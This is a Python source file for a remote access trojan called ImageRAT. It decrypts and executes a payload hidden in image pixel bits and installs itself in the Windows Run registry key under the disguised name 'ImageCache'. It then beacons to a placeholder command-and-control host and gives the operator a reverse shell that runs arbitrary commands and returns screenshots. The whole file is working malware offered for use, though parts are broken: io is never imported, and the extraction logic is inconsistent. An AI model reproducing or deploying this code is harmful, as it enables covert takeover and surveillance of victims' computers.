#!/usr/bin/env python3
import sys
import os
import socket
import subprocess
import time
import threading
import base64
from PIL import Image
from cryptography.fernet import Fernet
import pynput
import pyautogui
import psutil
import winreg

class ImageRAT:
    def __init__(self):
        self.c2_host = "YOUR_C2_IP"  # Change this
        self.c2_port = 1337
        self.temp_dir = os.path.join(os.getenv('TEMP'), 'imgcache')
        os.makedirs(self.temp_dir, exist_ok=True)
    
    def extract_self(self):
        """Extract payload from current image"""
        img_path = sys.argv[0] if getattr(sys, 'frozen', False) else __file__
        img = Image.open(img_path)
        pixels = list(img.getdata())
        
        # Extract LSB bits
        bits = ''
        for pixel in pixels:
            bits += str(pixel[0] & 1)
            bits += str(pixel[1] & 1) 
            bits += str(pixel[2] & 1)
        
        # Reconstruct bytes
        bytes_data = [bits[i:i+8] for i in range(0, len(bits), 8)]
        data = bytes(int(b, 2) for b in bytes_data if len(b) == 8)
        
        # Split key and payload
        key, payload = data.split(b'|', 1)
        return key, payload
    
    def persist(self):
        """Install persistence"""
        script_path = os.path.abspath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ImageCache", 0, winreg.REG_SZ, f'python "{script_path}"')
        winreg.CloseKey(key)
    
    def connect_c2(self):
        while True:
            try:
                s = socket.socket()
                s.connect((self.c2_host, self.c2_port))
                s.send(b"ImageRAT_CONNECTED")
                self.shell(s)
            except:
                time.sleep(10)
    
    def shell(self, s):
        while True:
            cmd = s.recv(1024).decode()
            if cmd == "exit": break
            
            if cmd == "screenshot":
                img = pyautogui.screenshot()
                img_byte_arr = io.BytesIO()
                img.save(img_byte_arr, format='PNG')
                img_data = base64.b64encode(img_byte_arr.getvalue())
                s.send(img_data)
            else:
                result = subprocess.getoutput(cmd)
                s.send(result.encode())
        s.close()

if __name__ == "__main__":
    rat = ImageRAT()
    key, payload = rat.extract_self()
    fernet = Fernet(key)
    
    # Decrypt and execute real payload
    real_payload = fernet.decrypt(payload).decode()
    exec(real_payload)
    
    # Install persistence silently
    rat.persist()
    
    # Beacon to C2
    threading.Thread(target=rat.connect_c2, daemon=True).start()
